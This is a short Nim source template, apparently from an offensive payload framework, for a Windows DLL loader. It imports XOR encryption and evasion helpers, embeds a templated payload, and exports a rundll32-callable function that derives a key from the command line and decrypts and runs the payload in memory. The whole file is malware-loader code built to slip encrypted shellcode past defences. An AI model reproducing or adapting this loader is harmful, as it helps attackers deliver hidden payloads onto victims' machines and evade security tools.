import ../core/crypto/exor/xorro
import {load_func}
import {evade_import}

{payload}

# Match the standard Rundll32 callback signature, just in case you need 
# something with args...
proc doYourThing(
        hwnd: pointer,
        hinst: pointer,
        cmdLine: cstring,
        cmdShow: int): int {.stdcall, exportc, dynlib.} =

    let key = evade(cmdLine)

    loadPayload(addr(payload[0]), payload.len, key)

    return 1

proc NimMain() {.cdecl, importc.}

proc DllMain(
        hModule: pointer,
        reason: uint32,
        reserved: pointer): bool {.stdcall, exportc, dynlib.} =

    if reason == 1:
        NimMain()

    result = true
